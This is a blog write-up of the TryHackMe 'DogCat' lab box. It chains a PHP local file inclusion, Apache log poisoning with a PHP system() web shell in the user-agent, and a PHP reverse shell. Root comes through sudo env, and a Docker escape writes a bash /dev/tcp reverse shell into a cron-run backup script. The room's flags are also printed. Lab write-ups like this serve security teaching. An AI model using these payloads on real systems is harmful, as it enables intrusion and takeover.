---
title: TryHackMe - DogCat
description: My writeup on DogCat box.
categories:
 - tryhackme
tags: tryhackme LFI php logpoisoning sudo env docker
---

![](https://i.imgur.com/otcW2ZH.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **DogCat**  |
| Difficulty :  | **Medium**             |
| Play :    | [DogCat](https://tryhackme.com/room/dogcat){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

This was an awesome box, with lot of LFI, php analysis etc i'll not say much, let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.157.103
$ nmap -sC -sV -oN nmap/dogcat.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-30 22:20 EET
Nmap scan report for 10.10.157.103 (10.10.157.103)
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```

Once we visit the website, we can see 2 buttons `A dog` & `A cat`.

![](https://i.imgur.com/DuBz9Wy.png)

We click a random one and we can see the URL goes like that `?view=dog`, that's probably LFI. LFI (Local File Inclusion) allow us to read files on the victim machine. The most common way to test that is by using the `/etc/passwd` file. Let's try it.

`http://$ip/?view=/etc/passwd` -> This gives an error `Sorry, only dogs or cats are allowed.` Let's try to add dog or cat in the URL.

`http://$ip/?view=dog/etc/passwd` -> This gives an error `Warning: include(dog/etc/passwd.php)` We can see it adds `.php` in all files, we can't read `/etc/passwd` but we can read the `index.php` source code! When we have LFI we can’t read php files because they get executed by the webserver. So we will do a trick to bypass that using base64.

Also here we have to apply a directory traversal attack `../`

```
$ curl -s "http://$ip/?view=php://filter/convert.base64-encode/resource=dog../../index"
PCFET0NUWVBF..data...go8L2h0bWw+Cg==
```

After we decode it we have the source code:

```php
function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
      }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
```

Now we have to do source code analysis. The most important thing in the source code is this variable:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```

We have a `ternary operator`, is an alternative method for using if-else statements. The syntax goes like that:

`(Condition) ? (Statement1) : (Statement2);`

We have the `$_GET`, is a PHP super global variable for collecting form data. For example `$_GET['pwn']` in URL will be like that `?pwn=`

So it translates to `ext` parameter should be equal to the `ext` GET parameter, else we it use `.php`

So we just have to add `&ext` to URL to read files.

```
$ curl -s "http://$ip/?view=dog../../../../../etc/passwd&ext"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

## Shell as www-data

Now we need to turn LFI into RCE. We will do apache log poisoning but to do that we need to be able to read log files. Let's try to load apache `access.log` file. `/var/log/apache2/access.log`

![](https://i.imgur.com/CnTRnmL.png)

Perfect, now let's fire up burp. Capture the request and inject this php code inside user-agent `<?php system($_GET['pwn']); ?>` also add to URL the parameter `&pwn=whoami`

![](https://i.imgur.com/1u7LGtU.png)

We have RCE!

```
$ curl -s "http://$ip/?view=dog../../../../../var/log/apache2/access.log&ext&pwn=whoami" | grep "www-data"
10.9.234.105 - - [30/Dec/2020:21:23:34 +0000] "GET /?view=dog../../../../../var/log/apache2/access.log&ext&pwn=whoami HTTP/1.1" 200 1991 "-" "Mozilla/5.0 www-data
```

Now we can simply send our reverse shell (remember to URL encode!)

```
$ curl -s "http://$ip/?view=dog../../../../../var/log/apache2/access.log&ext&pwn=php%20-r%20%27%24sock%3Dfsockopen%28%22<tun0 ip>%22%2C<port>%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
```

```
$ nc -lvp 5555
listening on [any] 5555 ...

$ whoami;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's search for the flags:

```
$ find / -name "flag*" 2>/dev/null
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
```

Flag 1: `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`

Flag 2: `THM{LF1_t0_RC3_aec3fb}`

## Shell as root

Now privesc to root is simply, let's just check `sudo -l`:

```
$ sudo -l
Matching Defaults entries for www-data on bf18790496b8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on bf18790496b8:
    (root) NOPASSWD: /usr/bin/env
```

We can run `env` as root, easy to exploit.

```
$ sudo env /bin/bash
whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Flag 3: `THM{D1ff3r3nt_3nv1ronments_874112}`

Hm.. we miss 1 flag tho. If we check the system root directory, we can see that we're inside docker container.

```
root@bf18790496b8:/# ls -la
total 80
drwxr-xr-x   1 root root 4096 Dec 30 20:19 .
drwxr-xr-x   1 root root 4096 Dec 30 20:19 ..
-rwxr-xr-x   1 root root    0 Dec 30 20:19 .dockerenv
...data...
```

We can also check that by the container id in the hostname.

```
root@bf18790496b8:/# hostname
bf18790496b8
```

Checking around the system i found under `/opt` as `backup.sh` file, seems like is running in the background. Let's add a reverse shell in.

```
root@bf18790496b8:/opt/backups# echo "bash -c 'bash -i >& /dev/tcp/<tun0 ip>/6666 0>&1'" > backup.sh
```

```
$ nc -lvp 6666
listening on [any] 6666 ...

root@dogcat:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

Flag 4: `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
